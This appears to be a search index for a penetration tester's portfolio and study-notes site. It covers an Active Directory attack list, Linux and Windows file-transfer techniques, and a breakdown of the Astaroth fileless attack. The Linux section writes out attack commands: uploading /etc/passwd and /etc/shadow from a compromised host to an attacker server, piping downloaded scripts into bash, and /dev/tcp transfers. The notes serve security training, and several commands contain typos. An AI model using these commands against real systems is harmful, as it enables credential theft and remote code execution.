{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to My Portfolio","text":""},{"location":"#about-me","title":"About Me","text":"<p>I am Samim Hakimi, a dedicated Penetration Tester and Cybersecurity Specialist with a mission to secure systems and networks. I specialize in identifying vulnerabilities, mitigating risks, and crafting robust security solutions through hands-on experience and a deep understanding of cybersecurity principles.</p>"},{"location":"#key-expertise","title":"Key Expertise","text":"<ul> <li> <p>Penetration Testing: Skilled in network, web application, and wireless security testing.</p> </li> <li> <p>Vulnerability Assessment: Expertise in using tools like Nessus, Nmap, and Metasploit to uncover and mitigate threats.</p> </li> <li> <p>Incident Response: Experience in analyzing and responding to security incidents using Wireshark and Sysmon.</p> </li> <li> <p>Programming &amp; Automation: Proficient in Python for automating repetitive security tasks.</p> </li> </ul>"},{"location":"#featured-projects","title":"Featured Projects","text":""},{"location":"#network-security-assessment","title":"Network Security Assessment","text":"<ul> <li> <p>Conducted vulnerability scans using Nessus and Nmap.</p> </li> <li> <p>Identified and mitigated critical issues in a simulated enterprise environment.</p> </li> </ul>"},{"location":"#web-application-testing","title":"Web Application Testing","text":"<ul> <li> <p>Performed manual and automated assessments with Burp Suite.</p> </li> <li> <p>Detected and exploited vulnerabilities, including SQL Injection and Cross-Site Scripting (XSS).</p> </li> </ul>"},{"location":"#wireless-penetration-testing","title":"Wireless Penetration Testing","text":"<ul> <li> <p>Secured wireless networks by testing weak encryption protocols with Aircrack-ng.</p> </li> <li> <p>Delivered actionable insights to enhance network security.</p> </li> </ul>"},{"location":"#active-directory-hardening","title":"Active Directory Hardening","text":"<ul> <li> <p>Configured and tested Active Directory security in a simulated setup.</p> </li> <li> <p>Analyzed security logs and detected privilege escalation attempts.</p> </li> </ul>"},{"location":"#tools-technologies","title":"Tools &amp; Technologies","text":"<ul> <li> <p>Operating Systems: Kali Linux, Windows 10</p> </li> <li> <p>Networking &amp; Security: Active Directory, Cisco Routers/Switches</p> </li> <li> <p>Security Tools: Metasploit, Nessus, Burp Suite, Nmap</p> </li> </ul>"},{"location":"#contact-me","title":"Contact Me","text":"<p>Let\u2019s collaborate on innovative security solutions or explore new opportunities together:</p> <ul> <li> <p>Email: x@deltacode.io</p> </li> <li> <p>LinkedIn: linkedin.com/in/samimhakimi</p> </li> <li> <p>GitHub: github.com/sammyHa</p> </li> </ul>"},{"location":"GithubCommit/","title":"Commit to github and push","text":"<p><code>bash  git add .  git commit -m \"Buff walkthrough\"  git push origin main</code></p>"},{"location":"Attack%20Types/AD%20Attacks/List-AD-Attacks/","title":"List AD Attacks","text":""},{"location":"Attack%20Types/AD%20Attacks/List-AD-Attacks/#beginner-to-advanced-active-directory-attacks","title":"Beginner to Advanced Active Directory Attacks","text":""},{"location":"Attack%20Types/AD%20Attacks/List-AD-Attacks/#beginner-to-advanced-active-directory-attacks_1","title":"Beginner to Advanced Active Directory Attacks","text":""},{"location":"Attack%20Types/AD%20Attacks/List-AD-Attacks/#beginner-level","title":"Beginner Level:","text":"<ol> <li>LLMNR/NBT-NS Poisoning</li> <li>SMB Relay Attack</li> <li>Pass-the-Hash (PtH)</li> <li>Pass-the-Ticket (PtT)</li> <li>Kerberoasting</li> <li>AS-REP Roasting</li> <li>NTLM Relay Attack</li> <li>Credential Dumping</li> <li>Brute Force Attacks on SMB or RDP</li> <li>Group Policy Preference (GPP) Exploitation</li> </ol>"},{"location":"Attack%20Types/AD%20Attacks/List-AD-Attacks/#intermediate-level","title":"Intermediate Level:","text":"<ol> <li>Golden Ticket Attack</li> <li>Silver Ticket Attack</li> <li>Skeleton Key Attack</li> <li>DCShadow Attack</li> <li>Overpass-the-Hash</li> <li>DCSync Attack</li> <li>Unconstrained Delegation Exploitation</li> <li>Printer Spooler Abuse</li> <li>LDAP Relay Attacks</li> <li>Exploiting Weak ACLs on AD Objects</li> <li>Privilege Escalation via Misconfigured Group Membership</li> <li>Exploiting Kerberos Delegation (Constrained, Resource-based)</li> </ol>"},{"location":"Attack%20Types/AD%20Attacks/List-AD-Attacks/#advanced-level","title":"Advanced Level:","text":"<ol> <li>Domain Trust Exploitation</li> <li>Shadow Credentials Exploitation</li> <li>ADCS (Active Directory Certificate Services) Abuse<ul> <li>ESC1: Misconfigured Certificate Templates</li> <li>ESC2: NTLM Relay to ADCS</li> </ul> </li> <li>Exploiting SID History</li> <li>Kerberos Resource-based Constrained Delegation (RBCD) Exploitation</li> <li>SAML Token Forging</li> <li>Cross-Forest Kerberoasting</li> <li>AD Database (NTDS.dit) Extraction</li> <li>AdminSDHolder Exploitation</li> <li>Exploiting Default Admin Shares</li> <li>ZeroLogon (Netlogon Vulnerability)</li> <li>Exploiting Unpatched AD Vulnerabilities (e.g., PrintNightmare, PetitPotam)</li> <li>Abuse of TrustedForDelegation and UserAccountControl Flags</li> <li>DNS Admin to Domain Admin Escalation</li> <li>ACL-based Persistence Techniques</li> </ol> <p>This list spans attacks from basic credential theft and manipulation to advanced persistence and trust exploitation techniques used by skilled attackers.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/","title":"Linux File Transfer Methods","text":""},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#linux-file-transfer-methods","title":"Linux File Transfer Methods","text":""},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#importance-of-file-transfer-knowledge","title":"Importance of File Transfer Knowledge","text":"<ul> <li> <p>Linux offers a variety of tools for file transfers.</p> </li> <li> <p>Understanding these methods improves both offensive and defensive cybersecurity skills.</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#real-world-incident-response-example","title":"Real-World Incident Response Example","text":"<ul> <li> <p>Scenario: Incident response on web servers revealed multiple threat actors in 6/9 servers.</p> </li> <li> <p>Vulnerability: Exploited SQL Injection to execute a malicious Bash script.</p> </li> <li> <p>Malicious Actions:</p> <ul> <li> <p>Downloaded malware connecting to a command and control (C2) server.</p> </li> <li> <p>Used three methods for downloading malware:</p> <ol> <li> <p>cURL</p> </li> <li> <p>wget</p> </li> <li> <p>Python</p> </li> </ol> </li> <li> <p>All methods communicated over HTTP.</p> </li> </ul> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#key-points-on-malware-communication","title":"Key Points on Malware Communication","text":"<ul> <li> <p>While Linux supports protocols like FTP and SMB, most malware relies on HTTP/HTTPS.</p> </li> <li> <p>Malware often leverages common Linux tools for file transfers due to their ubiquity.</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#file-transfer-methods-to-review","title":"File Transfer Methods to Review","text":"<ul> <li> <p>HTTP</p> </li> <li> <p>Bash Scripts</p> </li> <li> <p>SSH</p> </li> <li> <p>Additional tools and protocols will be covered in this section.</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#download-operations","title":"Download Operations","text":"<p>We have access to the machine <code>NIX04</code> and we need to downlaod a file from our Pwnbox machine. let's see how we can accomplish this using multiple file download methods. </p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#base64-encodoingdecoding","title":"Base64 Encodoing/Decoding","text":"<p>Depending on the file size we wnat to transfer, we can use a method that does not require network communication. if we have access to a terminal, we can encode a file to a base64 string, copying its content into the terminal and perfom the reverse operation. Let's see how we can do this with Bash.</p> <p>Pwnbox-Check File MD5 hash <pre><code>md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n</code></pre> We use <code>cat</code> to print the file content, and base64 encode the output using a pipe |. We used the option <code>-w 0</code> to crate only one line and ended up with the command with a semi-colon (;) and <code>echo</code> keyword to start a new line and make it easier to copy. Pwnbox - Encode SSH Key to Base64 <pre><code>cat id_rsa | base64 -w 0; echo\n</code></pre> We copy this content, pase it onto our Linux target machine, and use <code>base64</code> with the option <code>-d</code> to decode it.</p> <p>Line - Decode the File <pre><code>echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnph.....' | base64 -d &gt; id_rsa\n</code></pre> Finally, we ca nconfirm if the file was tranferred successfully using the <code>md5sum</code> command.</p> <p>Linux - Confirm the MD5 Hashes Match <pre><code>md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n</code></pre> Note: You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#web-downloads-with-wget-and-curl","title":"Web Downloads with Wget and cURL","text":"<p>Two of the most common utilities in LInux distributions to interact with we application are <code>wget</code> and <code>crul</code>. These tools are installed on many Linux distributions. to downlaod a file using <code>wget</code>, we need to specify the URL and the option (UPPERCASE O)<code>-O</code> to set the output filename.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#dwonload-file-using-wget","title":"Dwonload File Using wget","text":"<p><pre><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/Linenum.sh -O /tmp/LinEnum.sh\n</code></pre> <code>cURL</code> is very similar ot <code>wget</code>, but the output filename option is lwercase <code>-o</code></p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#download-a-file-using-curl","title":"Download a File Using cURL","text":"<pre><code>crul -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#fileless-attacks-using-linux","title":"Fileless Attacks Using Linux","text":"<ul> <li> <p>Definition: Fileless operations execute commands or payloads directly in memory without saving files to disk.</p> </li> <li> <p>Mechanism: Pipes in Linux enable chaining commands and transferring data without storing it on disk.</p> <ul> <li>Example:  <pre><code>echo 'payload' | bash\n</code></pre></li> </ul> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#understanding-fileless-operations","title":"Understanding Fileless Operations","text":""},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#tools-and-techniques","title":"Tools and Techniques","text":"<ul> <li> <p>Common Linux tools supporting fileless operations:</p> <ul> <li> <p>cURL and wget: Fetch and execute payloads directly.</p> </li> <li> <p>Python/Perl/Ruby: Execute inline scripts using interpreters.</p> </li> <li> <p>Bash scripts: Combine commands to avoid disk writes.</p> </li> </ul> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#caveats-and-considerations","title":"Caveats and Considerations","text":"<ul> <li> <p>Temporary Files:</p> <ul> <li> <p>Some payloads, like those using <code>mkfifo</code>, may create temporary files or artifacts.</p> </li> <li> <p>Execution may appear fileless, but traces could remain on the system.</p> </li> </ul> </li> <li> <p>Persistence Mechanisms:</p> <ul> <li> <p>Fileless does not imply stealth if temporary or residual files are created.</p> </li> <li> <p>Monitor processes and memory for signs of malicious activity.</p> </li> </ul> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#benefits-and-risks","title":"Benefits and Risks","text":"<ul> <li> <p>Advantages:</p> <ul> <li> <p>Increased stealth for attackers by avoiding direct file creation.</p> </li> <li> <p>Useful for quick in-memory execution during penetration tests.</p> </li> </ul> </li> <li> <p>Risks:</p> <ul> <li> <p>Can still leave detectable artifacts depending on the method used.</p> </li> <li> <p>May complicate incident response and forensics.</p> </li> </ul> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#examples-of-fileless-execution","title":"Examples of Fileless Execution","text":"<ul> <li> <p>Fileless Download with cURL</p> <p>Let's take the cURL command we used, and instead of downloading the LinEnum.sh, let's execute it directly using a pipe. <pre><code>crul https://raw.githubusercontent.com/LinEnum/master/LinEnum.sh | bash\n</code></pre></p> </li> <li> <p>Fileless Download with wget <pre><code>wget -qO- https://example.com/script.py | python3\n</code></pre></p> </li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#use-cases","title":"Use Cases","text":"<ol> <li> <p>Quick Setup Scripts</p> <ul> <li>Automate the installation of software or configuration tasks.</li> <li>Commonly used for installing utilities, frameworks, or environments (e.g., Node.js via <code>nvm</code>, Docker installation scripts).</li> <li>Example: <pre><code>curl -fsSL https://get.docker.com | bash\n</code></pre></li> </ul> </li> <li> <p>Testing Environments</p> <ul> <li>Quickly deploy or test a script without saving it locally.</li> <li>Useful for non-critical, throwaway environments like virtual machines or containers.</li> <li> <p>Bootstrapping</p> </li> <li> <p>Automating the initial setup of a system with dependencies and configurations.</p> </li> <li>Example: Setting up cloud instances with pre-configured scripts.</li> <li> <p>Remote Management</p> </li> <li> <p>Running commands or tasks on systems where you don\u2019t need to save the script locally.</p> </li> <li> <p>Educational Demonstrations</p> </li> <li> <p>Providing users with an easy one-liner to test or learn a concept.</p> </li> <li>Example: <pre><code>curl http://example.com/demo.sh | bash\n</code></pre></li> </ul> </li> </ol>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#risks-and-considerations","title":"Risks and Considerations","text":"<ol> <li> <p>Security Risks</p> <ul> <li>Code Injection: The script can be altered on the server to include malicious commands.</li> <li>Man-in-the-Middle Attacks: If <code>http://</code> is used instead of <code>https://</code>, attackers can intercept and modify the script.</li> <li> <p>No Validation</p> </li> <li> <p>The script is executed directly without being inspected by the user. This is inherently risky.</p> </li> <li> <p>Untrusted Sources</p> </li> <li> <p>Running a script from an unknown or unverified source can compromise the system.</p> </li> <li> <p>Loss of Control</p> </li> <li> <p>The script might modify system files, install backdoors, or perform other unintended actions.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#best-practices","title":"Best Practices","text":"<ol> <li> <p>Always Use HTTPS</p> <ul> <li>Ensure the source is served over HTTPS to prevent tampering.</li> <li> <p>Inspect the Script</p> </li> <li> <p>Download the script first and review its content before execution:     <pre><code>curl -O http://example.com/bash.sh less bash.sh  # Inspect the script bash bash.sh  # Run only if safe\n</code></pre></p> </li> </ul> </li> <li> <p>Use Signing or Hash Verification</p> <ul> <li>Verify the script using a checksum or GPG signature provided by the source.</li> <li> <p>Use Minimal Privileges</p> </li> <li> <p>Avoid running the script as root unless necessary.</p> </li> <li> <p>Sandbox Testing</p> </li> <li> <p>Test the script in a virtual machine or container before running it on production systems.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#summary","title":"Summary","text":"<p>The <code>curl http://example.com/bash.sh | bash</code> approach is convenient but risky. It should only be used with trusted sources and proper security measures in place. A safer alternative is to download and inspect the script first before execution.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#key-takeaway","title":"Key Takeaway","text":"<ul> <li>Leverage fileless methods for stealthy operations, but understand their limitations and the potential for residual artifacts.</li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#download-with-bash-devtcp","title":"Download with Bash (/dev/tcp)","text":"<ul> <li>In situations where no well-known file transfer tools (e.g., <code>wget</code>, <code>curl</code>, <code>scp</code>) are available, Bash itself can be used to transfer files.</li> <li>This method relies on the <code>/dev/TCP</code> device file, which is supported if Bash version 2.04 or greater is installed and compiled with the <code>--enable-net-redirections</code> option.</li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#requirements","title":"Requirements","text":"<ol> <li>Bash version 2.04 or later.</li> <li>Bash must be compiled with <code>--enable-net-redirections</code>.</li> </ol>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#using-devtcp-for-file-downloads","title":"Using <code>/dev/TCP</code> for File Downloads","text":"<ul> <li>The <code>/dev/TCP</code> file allows Bash to make raw network connections for sending or receiving data.</li> <li>Example: Downloading a file using <code>/dev/TCP</code>.</li> </ul> <pre><code>exec 3&lt;&gt; /dev/tcp/&lt;server&gt;/&lt;port&gt;\necho -e \"GET /path/to/file HTTP/1.1\\r\\nHost: &lt;server&gt;\\r\\nConnection: close\\r\\n\\r\\n\" &gt;&amp;3 cat &lt;&amp;3 &gt; downloaded_file\nexec 3&gt;&amp;\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#connect-to-the-target-webserver","title":"Connect to the Target Webserver","text":"<pre><code>exec 3&gt;?/dev/tcp/10.10.10.32/80\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#http-get-request","title":"HTTP GET Request","text":"<pre><code>echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\\\n\"&gt;&amp;3\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#print-the-response","title":"Print the Response","text":"<pre><code>cat &lt;&amp;3\n</code></pre> <p>Explanation:</p> <ul> <li><code>exec 3&lt;&gt; /dev/tcp/&lt;server&gt;/&lt;port&gt;</code>: Opens a connection to the specified server and port.</li> <li><code>echo</code>: Sends an HTTP GET request to the server.</li> <li><code>cat &lt;&amp;3 &gt; downloaded_file</code>: Reads the response from the server and saves it as a file.</li> <li><code>exec 3&gt;&amp;-</code>: Closes the file descriptor.</li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#limitations","title":"Limitations","text":"<ol> <li>No support for HTTPS (without additional tools).</li> <li>Requires understanding of raw protocols (e.g., crafting HTTP requests manually).</li> <li>May not work if <code>--enable-net-redirections</code> is not enabled in Bash.</li> </ol>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#use-cases_1","title":"Use Cases","text":"<ul> <li>Minimalist environments where file transfer tools are not available.</li> <li>Quick and simple file transfer on systems with limited resources.</li> </ul> <p>This method provides a lightweight and powerful alternative when traditional file transfer utilities are unavailable.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#ssh-downloads","title":"SSH Downloads","text":"<p>SSH or (Secure Shell) is a protocol that allows secure access to remote coputers. SSH implementation comes with an <code>scp</code> utility for remtoe file transfer that, by default, uses the SSH protocol. <code>SCP</code> secure copy is a command -line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine. <code>SCP</code> is very similar to <code>copy</code> or <code>cp</code> but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#setting-up-the-ssh-server","title":"Setting up the SSH server","text":"<pre><code>sudo systemctl enable ssh\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#starting-the-ssh-server","title":"Starting the SSH Server","text":"<pre><code>sudo systemctl start ssh\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#checking-for-ssh-listening-port","title":"Checking for SSH Listening Port","text":"<p><pre><code>netstat -lnpt\n\n$ netstat -lnpt\n\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - \n</code></pre> Now we can begin transferring files. We need to specify the following.  - IP - Username - Password</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#linux-downloaing-file-using-scp","title":"Linux Downloaing File Using SCP","text":"<p><pre><code>scp plaintext@192.168.49.128:/root/myroot.txt .\n</code></pre> Note: You can create a temporary user account for file transfer and avoid using the primary credentials or keys on a remote computer.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#macos-ssh-turn-on-or-off","title":"MacOS SSH turn ON or OFF","text":"<pre><code># check status\nsudo systemsetup -getremotelogin\n\n## Turn on or off\nsudo systemsetup -setremotelogin on\nsudo systemsetup -setremotelogin off\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#upload-operations","title":"Upload Operations","text":"<p>There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uplaods. Let's see how we can upload files in various ways.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#web-uploads","title":"Web Uploads","text":"<p>We can use <code>uploadserver</code> an extended module of the Python <code>HTTP.Server</code> module, which includes a file upload page.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#install-uploadserver","title":"Install `uploadserver","text":"<pre><code>sudo python3 -m pip install --user uploadserver\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#create-a-self-signed-certificate","title":"Create a SElf-Signed Certificate","text":"<pre><code>openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#command-breakdown","title":"Command Breakdown:","text":"<ol> <li> <p><code>openssl req</code>:</p> <ul> <li>This invokes the <code>req</code> (Certificate Request) command, used to generate X.509 certificate requests or self-signed certificates.</li> <li> <p><code>-x509</code>:</p> </li> <li> <p>Tells OpenSSL to output a self-signed X.509 certificate instead of a certificate signing request (CSR).</p> </li> <li>X.509 is the standard format for public key certificates.</li> <li> <p><code>-out server.pem</code>:</p> </li> <li> <p>Specifies the name of the file where the generated certificate will be saved (<code>server.pem</code>).</p> </li> <li> <p><code>-keyout server.pem</code>:</p> </li> <li> <p>Specifies the file where the private key will be saved. In this case, both the private key and the certificate are saved in the same file (<code>server.pem</code>).</p> </li> <li> <p><code>-newkey rsa:2048</code>:</p> </li> <li> <p>Tells OpenSSL to generate a new private key and a corresponding certificate.</p> </li> <li><code>rsa:2048</code> specifies that the private key should use the RSA algorithm with a key size of 2048 bits.</li> <li> <p><code>-nodes</code>:</p> </li> <li> <p>Stands for \"No DES encryption.\"</p> </li> <li>Ensures that the private key is not encrypted with a passphrase. This is useful in automated environments where entering a password interactively is not feasible.</li> <li> <p><code>-sha256</code>:</p> </li> <li> <p>Specifies the hashing algorithm to use for the certificate's signature. SHA-256 is a secure and widely used hashing algorithm.</p> </li> <li> <p><code>-subj '/CN=server'</code>:</p> </li> <li> <p>Provides the subject information for the certificate in a single string.</p> </li> <li><code>/CN=server</code> sets the Common Name (CN) field of the certificate to \"server.\"</li> <li>Common Name typically represents the domain name or identifier for which the certificate is issued.</li> </ul> </li> </ol>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#purpose","title":"Purpose:","text":"<p>This command generates:</p> <ol> <li>A self-signed certificate that can be used to establish HTTPS or other secure communications for a server.</li> <li>A private key paired with the certificate, stored in the same file (<code>server.pem</code>).</li> </ol> <p>This is particularly useful for testing, internal services, or when you don't need a certificate signed by a trusted Certificate Authority (CA).</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#example-usage","title":"Example Usage:","text":"<ul> <li>For Testing: Use this self-signed certificate in a local or development environment to set up HTTPS for a server.</li> <li>Simple TLS Servers: Use it for internal services or quick setups where security doesn't depend on being trusted by external clients.</li> </ul>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#output","title":"Output:","text":"<p>The resulting file, <code>server.pem</code>, contains both the private key and the self-signed certificate. You can inspect the contents using: <pre><code>openssl x509 -in server.pem -text -noout\n</code></pre></p> <p>or to view the private key: <pre><code>openssl rsa -in server.pem -check\n</code></pre></p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#start-a-web-server","title":"Start a Web Server","text":"<p><pre><code>mkdir https &amp;&amp; cd https\nsudo python3 -m uuploadserver 443 --server-certificate ~/server.pem\n</code></pre> Now from our compromised machine, let's upload the <code>/etc/passwd</code> and <code>/etc/shadow</code> files. <pre><code>curl -X POST https://192.168.0.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n</code></pre> WE sued the option <code>--insecure</code> becase we used a self-signed certificate that we trust.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#alternative-wev-file-transfer-methods","title":"Alternative Wev File Transfer Methods","text":"<p>Since Linux distributions usually have Python or php installed, starting a web server to transfer files is straightforward. <pre><code>python3 -m http.server\n</code></pre></p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#creating-a-web-server-with-python27","title":"Creating a Web Server with Python2/7","text":"<pre><code>python2.7 -m http.server\n</code></pre>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#creating-a-web-server-with-php","title":"Creating a Web Server with PHP","text":"<p><pre><code>php -S 0.0.0.0:8000\n</code></pre> Creating a Web Server with Ruby <pre><code>ruby -run -ehttpd . -p8000\n</code></pre></p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#download-the-file-from-the-target-machine-onto-the-pwnbox","title":"Download the File from the Target Machine onto the Pwnbox","text":"<p><pre><code>wget 192.168.0.113:8000/filetotransfer.txt\n</code></pre> Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#csp-upload","title":"CSP Upload","text":"<p>Some companies allow <code>SSH protocol</code>(TCP/22) for outbound connections, and if that's the case we can use an SSH server with the <code>scp</code> utility to upload file.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#upload-file-using-scp","title":"upload file using SCP","text":"<p><pre><code>scp /etc/passwd http-student@&lt;ip&gt;:/home/htp-student/\n</code></pre> Note: Remember that scp syntax is similar to cp or copy.</p>"},{"location":"CPTS/File%20Transfers/Linux%20File%20Transfer%20Methods/#onwards","title":"Onwards","text":"<p>These are the most common file transfer methods using built-in tools on Linux systems, but there's more. In the following sections, we'll discuss other mechanisms and tools we can use to perform file transfer operations.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/","title":"Win File Transfer Methods","text":"<p>Overview</p> <p>The Windows operating system has evolved significantly, with new versions introducing various utilities for file transfer operations. Understanding file transfer mechanisms in Windows is crucial for both attackers and defenders:</p> <ul> <li> <p>Attackers: Leverage file transfer methods to operate stealthily and evade detection.</p> </li> <li> <p>Defenders: Learn how these methods work to monitor and enforce policies that prevent attacks.</p> </li> </ul> <p>To illustrate, we will examine the Microsoft Astaroth Attack, a documented advanced persistent threat (APT) example.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#fileless-threats-and-file-transfer","title":"Fileless Threats and File Transfer","text":"<p>The Astaroth attack demonstrates how attackers utilize fileless techniques to execute their operations. Despite the name, fileless threats often involve file transfer operations, though the files themselves are not stored on disk but executed in memory.</p>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#what-are-fileless-threats","title":"What Are Fileless Threats?","text":"<ul> <li>Fileless threats leverage legitimate tools and processes already present on a system to carry out attacks.</li> <li>These threats do not leave traditional files behind, making detection more challenging.</li> </ul>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#breakdown-of-the-astaroth-attack","title":"Breakdown of the Astaroth Attack","text":"<ol> <li> <p>Initial Infection via Spear-Phishing</p> <ul> <li>A malicious link embedded in a spear-phishing email leads to the download of an LNK file.</li> <li>The user clicks the LNK file, triggering execution.</li> </ul> </li> <li> </li> <li> </li> <li> </li> <li> </li> <li> </li> </ol>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#abuse-of-wmic-tool","title":"Abuse of WMIC Tool","text":"<ul> <li>The WMIC tool (Windows Management Instrumentation Command-line) is executed with the \"/Format\" parameter.</li> <li>This parameter is abused to download and execute malicious JavaScript code.</li> </ul>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#file-transfer-via-bitsadmin","title":"File Transfer via Bitsadmin","text":"<ul> <li>The malicious JavaScript code downloads additional payloads using the Bitsadmin tool, a legitimate utility for background file transfers.</li> </ul>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#decoding-payloads-with-certutil","title":"Decoding Payloads with Certutil","text":"<ul> <li>Downloaded payloads are Base64-encoded.</li> <li>The Certutil tool is used to decode these payloads into their original form, resulting in multiple DLL files.</li> </ul>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#execution-with-regsvr32","title":"Execution with regsvr32","text":"<ul> <li> <p>One of the decoded DLLs is loaded using the regsvr32 tool.</p> </li> <li> <p>This DLL decrypts and loads additional files until the final payload is ready.</p> </li> </ul>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#final-payload-injection","title":"Final Payload Injection","text":"<ul> <li>The final payload, Astaroth, is injected into the Userinit process, allowing the attacker to persist and execute their malicious operations stealthily.</li> </ul>"},{"location":"CPTS/File%20Transfers/Win%20File%20Transfer%20Methods/#visual-representation-of-the-astaroth-attack","title":"Visual Representation of the Astaroth Attack","text":"<p>Below is a high-level graphical depiction of the attack:</p> <ol> <li> <p>Spear-phishing email \u2794 LNK file.</p> </li> <li> <p>Execution of WMIC with /Format parameter.</p> </li> <li> <p>JavaScript downloads payloads using Bitsadmin.</p> </li> <li> <p>Certutil decodes Base64 payloads into DLL files.</p> </li> <li> <p>regsvr32 loads DLLs, decrypting and loading additional files.</p> </li> <li> <p>Final payload (Astaroth) is injected into the Userinit process.</p> </li> </ol> <p>Understanding such attacks allows defenders to:</p> <ul> <li> <p>Detect unusual activity from legitimate tools (e.g., WMIC, Certutil, regsvr32).</p> </li> <li> <p>Monitor file transfer methods and create preventive policies.</p> </li> </ul> <p>Attackers continue to innovate, but knowledge of their methods ensures defenders can remain vigilant and respond effectively.</p> 